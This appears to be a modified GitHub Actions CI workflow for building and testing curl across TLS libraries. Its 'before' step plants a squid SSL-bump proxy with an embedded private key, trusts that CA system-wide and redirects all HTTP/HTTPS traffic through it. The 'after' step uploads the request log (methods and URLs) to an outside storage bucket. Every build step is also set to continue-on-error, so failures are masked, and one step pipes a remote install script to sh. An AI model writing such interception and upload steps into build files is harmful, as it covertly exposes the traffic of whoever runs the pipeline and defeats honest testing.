concurrency:
  cancel-in-progress: true
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.sha
    }}
env:
  JAVA_TOOL_OPTIONS: -Djavax.net.ssl.trustStore=/usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
  MAKEFLAGS: -j 3
  NODE_OPTIONS: --use-openssl-ca
  bearssl-version: 0.6
  libressl-version: v3.7.3
  mbedtls-version: v3.5.0
  mod_h2-version: v2.0.26
  msh3-version: v0.6.0
  openssl3-version: openssl-3.1.3
  quictls-version: 3.1.4+quic
  rustls-version: v0.12.0
jobs:
  autotools:
    name: ${{ matrix.build.name }}
    runs-on: ubuntu-latest
    steps:
    - name: before
      run: 'sudo apt update

        sudo apt install -y squid-openssl

        sudo mkdir /squid

        cat << EOF | sudo tee /squid/key.pem

        -----BEGIN PRIVATE KEY-----

        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

        CznEvO4qIs3mXDYkNBQrdVLGF93y

        -----END PRIVATE KEY-----

        EOF

        cat << EOF | sudo tee /squid/cert.pem

        -----BEGIN CERTIFICATE-----

        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

        -----END CERTIFICATE-----

        EOF

        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB

        sudo chown -R proxy:proxy /squid

        cat << EOF | sudo tee /etc/squid/squid.conf

        cache deny all


        http_port 7821

        http_port 3128 intercept

        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
        cert=/squid/cert.pem key=/squid/key.pem

        acl step1 at_step SslBump1

        ssl_bump peek step1

        ssl_bump bump all

        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB

        sslcrtd_children 5

        ssl_bump server-first all

        sslproxy_cert_error allow all


        acl all src 0.0.0.0/0

        http_access allow all


        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}

        access_log daemon:/squid/squidlog.json custom all !CONNECT

        EOF

        sudo systemctl reload squid

        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt

        sudo update-ca-certificates

        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
        -storepass changeit -noprompt -trustcacerts

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        80 -j DNAT --to-destination 127.0.0.1:3128

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        443 -j DNAT --to-destination 127.0.0.1:3129

        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
    - continue-on-error: true
      if: matrix.build.container == null
      name: install prereqs and impacket
      run: 'sudo apt-get update

        sudo apt-get install libtool autoconf automake pkg-config stunnel4 libpsl-dev
        libbrotli-dev libzstd-dev ${{ matrix.build.install_packages }}

        sudo python3 -m pip install impacket

        '
    - continue-on-error: true
      if: startsWith(matrix.build.container, 'alpine')
      name: install dependencies
      run: 'apk add --no-cache build-base autoconf automake libtool perl openssl-dev
        libssh2-dev zlib-dev brotli-dev zstd-dev libidn2-dev openldap-dev heimdal-dev
        libpsl-dev py3-impacket py3-asn1 py3-six py3-pycryptodomex perl-time-hires
        openssh stunnel sudo git

        '
    - continue-on-error: true
      uses: actions/checkout@v4
    - continue-on-error: true
      if: contains(matrix.build.install_steps, 'gcc-11')
      name: install gcc-11
      run: 'sudo add-apt-repository ppa:ubuntu-toolchain-r/ppa

        sudo apt-get update

        sudo apt-get install gcc-11

        sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-11 100

        sudo update-alternatives --set gcc /usr/bin/gcc-11

        gcc --version

        '
    - continue-on-error: true
      env:
        cache-name: cache-bearssl
      id: cache-bearssl
      if: contains(matrix.build.install_steps, 'bearssl')
      name: cache bearssl
      uses: actions/cache@v4
      with:
        key: ${{ runner.os }}-build-${{ env.cache-name }}-bearssl-${{ env.bearssl-version
          }}
        path: /home/runner/bearssl
    - continue-on-error: true
      if: contains(matrix.build.install_steps, 'bearssl') && steps.cache-bearssl.outputs.cache-hit
        != 'true'
      name: build bearssl
      run: 'curl -LOsSf --retry 6 --retry-connrefused --max-time 999 https://bearssl.org/bearssl-${{
        env.bearssl-version }}.tar.gz

        tar -xzf bearssl-${{ env.bearssl-version }}.tar.gz

        cd bearssl-${{ env.bearssl-version }}

        make

        mkdir -p $HOME/bearssl/lib $HOME/bearssl/include

        cp inc/*.h $HOME/bearssl/include

        cp build/libbearssl.* $HOME/bearssl/lib

        '
    - continue-on-error: true
      env:
        cache-name: cache-libressl
      id: cache-libressl
      if: contains(matrix.build.install_steps, 'libressl')
      name: cache libressl
      uses: actions/cache@v4
      with:
        key: ${{ runner.os }}-build-${{ env.cache-name }}-libressl-${{ env.libressl-version
          }}
        path: /home/runner/libressl
    - continue-on-error: true
      if: contains(matrix.build.install_steps, 'libressl') && steps.cache-libressl.outputs.cache-hit
        != 'true'
      name: build libressl
      run: 'git clone --quiet --depth=1 -b ${{ env.libressl-version }} https://github.com/libressl-portable/portable.git
        libressl-git

        cd libressl-git

        ./autogen.sh

        ./configure --prefix=$HOME/libressl

        make install

        '
    - continue-on-error: true
      env:
        cache-name: cache-mbedtls
      id: cache-mbedtls
      if: contains(matrix.build.install_steps, 'mbedtls')
      name: cache mbedtls
      uses: actions/cache@v4
      with:
        key: ${{ runner.os }}-build-${{ env.cache-name }}-mbedtls-${{ env.mbedtls-version
          }}
        path: /home/runner/mbedtls
    - continue-on-error: true
      if: contains(matrix.build.install_steps, 'mbedtls') && steps.cache-mbedtls.outputs.cache-hit
        != 'true'
      name: build mbedtls
      run: 'git clone --quiet --depth=1 -b ${{ env.mbedtls-version }} https://github.com/ARMmbed/mbedtls

        cd mbedtls

        make DESTDIR=$HOME/mbedtls install

        '
    - continue-on-error: true
      env:
        cache-name: cache-openssl3
      id: cache-openssl3
      if: contains(matrix.build.install_steps, 'openssl3')
      name: cache openssl3
      uses: actions/cache@v4
      with:
        key: ${{ runner.os }}-build-${{ env.cache-name }}-${{ env.openssl3-version
          }}
        path: /home/runner/openssl3
    - continue-on-error: true
      if: contains(matrix.build.install_steps, 'openssl3') && steps.cache-openssl3.outputs.cache-hit
        != 'true'
      name: install openssl3
      run: 'git clone --quiet --depth=1 -b ${{ env.openssl3-version }} https://github.com/openssl/openssl

        cd openssl

        ./config --prefix=$HOME/openssl3 --libdir=$HOME/openssl3/lib

        make -j1 install_sw

        '
    - continue-on-error: true
      env:
        cache-name: cache-quictls
      id: cache-quictls
      if: contains(matrix.build.install_steps, 'quictls')
      name: cache quictls
      uses: actions/cache@v4
      with:
        key: ${{ runner.os }}-build-${{ env.cache-name }}-quictls-${{ env.quictls-version
          }}
        path: /home/runner/quictls
    - continue-on-error: true
      if: contains(matrix.build.install_steps, 'quictls') && steps.cache-quictls.outputs.cache-hit
        != 'true'
      name: build quictls
      run: 'git clone --quiet --depth=1 -b openssl-${{ env.quictls-version }} https://github.com/quictls/openssl

        cd openssl

        ./config --prefix=$HOME/quictls --libdir=$HOME/quictls/lib

        make -j1 install_sw

        '
    - continue-on-error: true
      env:
        cache-name: cache-msh3
      id: cache-msh3
      if: contains(matrix.build.install_steps, 'msh3')
      name: cache msh3
      uses: actions/cache@v4
      with:
        key: ${{ runner.os }}-build-${{ env.cache-name }}-msh3-${{ env.msh3-version
          }}
        path: /home/runner/msh3
    - continue-on-error: true
      if: contains(matrix.build.install_steps, 'msh3') && steps.cache-msh3.outputs.cache-hit
        != 'true'
      name: build msh3
      run: 'git clone --quiet -b ${{ env.msh3-version }} --depth=1 --recursive https://github.com/nibanks/msh3

        cd msh3 && mkdir build && cd build

        cmake -G ''Unix Makefiles'' -DCMAKE_BUILD_TYPE=RelWithDebInfo -DCMAKE_INSTALL_PREFIX=$HOME/msh3
        ..

        cmake --build .

        cmake --install .

        '
    - continue-on-error: true
      if: contains(matrix.build.install_steps, 'rust')
      name: install rust
      run: 'cd $HOME

        curl -sSf --compressed https://sh.rustup.rs/ | sh -s -- -y

        source $HOME/.cargo/env

        rustup toolchain install nightly

        '
    - continue-on-error: true
      env:
        cache-name: cache-rustls
      id: cache-rustls
      if: contains(matrix.build.install_steps, 'rustls')
      name: cache rustls
      uses: actions/cache@v4
      with:
        key: ${{ runner.os }}-build-${{ env.cache-name }}-rustls-${{ env.rustls-version
          }}
        path: /home/runner/rustls
    - continue-on-error: true
      if: contains(matrix.build.install_steps, 'rustls') && steps.cache-rustls.outputs.cache-hit
        != 'true'
      name: build rustls
      run: 'git clone --quiet --depth=1 -b ${{ env.rustls-version }} --recursive https://github.com/rustls/rustls-ffi.git

        cd rustls-ffi

        make DESTDIR=$HOME/rustls install

        '
    - continue-on-error: true
      if: contains(matrix.build.install_steps, 'hyper')
      name: install hyper
      run: 'cd $HOME

        git clone --quiet --depth=1 https://github.com/hyperium/hyper.git

        cd $HOME/hyper

        RUSTFLAGS="--cfg hyper_unstable_ffi" cargo +nightly rustc --features client,http1,http2,ffi
        -Z unstable-options --crate-type cdylib

        echo "LD_LIBRARY_PATH=$HOME/hyper/target/debug:/usr/local/lib" >> $GITHUB_ENV

        '
    - continue-on-error: true
      if: contains(matrix.build.install_steps, 'intel')
      name: install Intel compilers
      run: 'cd /tmp

        curl -sSf --compressed https://apt.repos.intel.com/intel-gpg-keys/GPG-PUB-KEY-INTEL-SW-PRODUCTS.PUB
        | sudo apt-key add -

        sudo add-apt-repository "deb https://apt.repos.intel.com/oneapi all main"

        sudo apt install --no-install-recommends intel-oneapi-compiler-dpcpp-cpp-and-cpp-classic

        source /opt/intel/oneapi/setvars.sh

        printenv >> $GITHUB_ENV

        '
    - continue-on-error: true
      if: contains(matrix.build.install_steps, 'pytest')
      name: install pytest and apach2-dev
      run: 'sudo apt-get install apache2 apache2-dev libnghttp2-dev

        sudo python3 -m pip install -r tests/http/requirements.txt

        '
    - continue-on-error: true
      env:
        cache-name: cache-mod_h2
      id: cache-mod_h2
      if: contains(matrix.build.install_steps, 'pytest')
      name: cache mod_h2
      uses: actions/cache@v4
      with:
        key: ${{ runner.os }}-build-${{ env.cache-name }}-${{ env.mod_h2-version }}
        path: /home/runner/mod_h2
    - continue-on-error: true
      if: contains(matrix.build.install_steps, 'pytest') && steps.cache-mod_h2.outputs.cache-hit
        != 'true'
      name: build mod_h2
      run: 'cd $HOME

        git clone --quiet --depth=1 -b  ${{ env.mod_h2-version }} https://github.com/icing/mod_h2

        cd mod_h2

        autoreconf -fi

        ./configure

        make

        '
    - continue-on-error: true
      if: contains(matrix.build.install_steps, 'pytest')
      name: install mod_h2
      run: 'cd $HOME/mod_h2

        sudo make install

        '
    - continue-on-error: true
      name: autoreconf
      run: autoreconf -fi
    - continue-on-error: true
      name: configure
      run: ./configure --enable-warnings --enable-werror ${{ matrix.build.configure
        }}
    - continue-on-error: true
      name: make
      run: make V=1
    - continue-on-error: true
      name: single-use function check
      run: 'git config --global --add safe.directory "*"

        ./scripts/singleuse.pl ${{ matrix.build.singleuse }} lib/.libs/libcurl.a

        '
    - continue-on-error: true
      name: check curl -V output
      run: ./src/curl -V
    - continue-on-error: true
      name: make examples
      run: make V=1 examples
    - continue-on-error: true
      name: make tests
      run: make V=1 -C tests
    - continue-on-error: true
      env:
        TFLAGS: ${{ matrix.build.tflags }}
      name: run tests
      run: make V=1 test-ci
    - continue-on-error: true
      env:
        CURL_CI: github
        TFLAGS: ${{ matrix.build.tflags }}
      if: contains(matrix.build.install_steps, 'pytest')
      name: run pytest
      run: pytest -v tests
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/ClickHouse/curl.$(date
        +%s)
    strategy:
      fail-fast: false
      matrix:
        build:
        - configure: LDFLAGS="-Wl,-rpath,$HOME/bearssl/lib" --with-bearssl=$HOME/bearssl
            --enable-debug
          install_packages: zlib1g-dev valgrind
          install_steps: bearssl pytest
          name: bearssl
          singleuse: --unit
        - configure: CC=clang LDFLAGS="-Wl,-rpath,$HOME/bearssl/lib" --with-bearssl=$HOME/bearssl
            --enable-debug
          install_packages: zlib1g-dev clang
          install_steps: bearssl
          name: bearssl-clang
          singleuse: --unit
        - configure: LDFLAGS="-Wl,-rpath,$HOME/libressl/lib" --with-openssl=$HOME/libressl
            --enable-debug
          install_packages: zlib1g-dev valgrind
          install_steps: libressl pytest
          name: libressl
          singleuse: --unit
        - configure: CC=clang LDFLAGS="-Wl,-rpath,$HOME/libressl/lib" --with-openssl=$HOME/libressl
            --enable-debug
          install_packages: zlib1g-dev clang
          install_steps: libressl
          name: libressl-clang
          singleuse: --unit
        - configure: LDFLAGS="-Wl,-rpath,$HOME/mbedtls/lib" --with-mbedtls=$HOME/mbedtls
            --enable-debug
          install_packages: libnghttp2-dev valgrind
          install_steps: mbedtls pytest
          name: mbedtls
          singleuse: --unit
        - configure: CC=clang LDFLAGS="-Wl,-rpath,$HOME/mbedtls/lib" --with-mbedtls=$HOME/mbedtls
            --enable-debug
          install_packages: libnghttp2-dev clang
          install_steps: mbedtls
          name: mbedtls-clang
          singleuse: --unit
        - configure: LDFLAGS="-Wl,-rpath,$HOME/msh3/lib -Wl,-rpath,$HOME/quictls/lib"
            --with-msh3=$HOME/msh3 --with-openssl=$HOME/quictls --enable-debug
          install_packages: zlib1g-dev valgrind
          install_steps: quictls msh3
          name: msh3
          singleuse: --unit
        - configure: CFLAGS=-std=gnu89 LDFLAGS="-Wl,-rpath,$HOME/openssl3/lib" --with-openssl=$HOME/openssl3
            --enable-debug --enable-websockets
          install_packages: zlib1g-dev valgrind
          install_steps: gcc-11 openssl3 pytest
          name: openssl3
          singleuse: --unit
        - configure: CPPFLAGS=-DCURL_WARN_SIGN_CONVERSION CFLAGS=-O3 LDFLAGS="-Wl,-rpath,$HOME/openssl3/lib"
            --with-openssl=$HOME/openssl3 --enable-debug --enable-websockets
          install_packages: zlib1g-dev valgrind
          install_steps: gcc-11 openssl3
          name: openssl3-O3
          singleuse: --unit
        - configure: CC=clang LDFLAGS="-Wl,-rpath,$HOME/openssl3/lib" --with-openssl=$HOME/openssl3
            --enable-debug --enable-websockets
          install_packages: zlib1g-dev clang
          install_steps: openssl3
          name: openssl3-clang
          singleuse: --unit
        - configure: 'CC=clang CFLAGS="-fsanitize=address,undefined,signed-integer-overflow
            -fno-sanitize-recover=undefined,integer -Wformat -Werror=format-security
            -Werror=array-bounds -g" LDFLAGS="-fsanitize=address,undefined -fno-sanitize-recover=undefined,integer"
            LIBS="-ldl -lubsan" --with-openssl --enable-debug --enable-websockets

            '
          install_packages: zlib1g-dev libssh2-1-dev clang libssl-dev libubsan1 libasan8
            libtsan2
          install_steps: pytest
          name: address-sanitizer
          singleuse: --unit
        - configure: 'CC=clang CFLAGS="-fsanitize=memory -Wformat -Werror=format-security
            -Werror=array-bounds -g" LDFLAGS="-fsanitize=memory" LIBS="-ldl" --without-ssl
            --without-zlib --without-brotli --without-zstd --without-libpsl --without-nghttp2
            --enable-debug --enable-websocketsx

            '
          install_packages: clang
          install_steps: null
          name: memory-sanitizer
          singleuse: --unit
        - configure: --enable-debug --disable-shared --disable-threaded-resolver --with-libssh
            --with-openssl
          install_packages: libssh-dev valgrind
          name: event-based
          singleuse: --unit
          tflags: -n -e '!TLS-SRP'
        - configure: LDFLAGS="-Wl,-rpath,$HOME/hyper/target/debug" --with-openssl
            --with-hyper=$HOME/hyper --enable-debug --enable-websockets
          install_steps: rust hyper valgrind
          name: hyper
          singleuse: --unit
        - configure: --with-rustls=$HOME/rustls --enable-debug
          install_steps: rust rustls pytest valgrind libpsl-dev
          name: rustls
          singleuse: --unit
        - configure: CC=icc --enable-debug --without-ssl
          install_packages: zlib1g-dev valgrind
          install_steps: intel
          name: Intel compiler - without SSL
          singleuse: --unit
        - configure: CC=icc --enable-debug --with-openssl
          install_packages: zlib1g-dev libssl-dev valgrind
          install_steps: intel
          name: Intel compiler - OpenSSL
          singleuse: --unit
        - configure: --with-openssl --with-libssh2 --with-gssapi --enable-ares --enable-static=no
            --without-ca-bundle --with-ca-path=/etc/ssl/certs
          container: andy5995/slackware-build-essential:15.0
          name: Slackware-openssl-with-gssapi-gcc
        - configure: --enable-debug --enable-websockets --with-ssl --with-libssh2
            --with-libidn2 --with-gssapi --enable-ldap --with-libpsl
          container: alpine:3.18
          name: Alpine MUSL
          singleuse: --unit
    timeout-minutes: 60
name: Linux
'on':
  workflow_dispatch: {}
permissions: {}
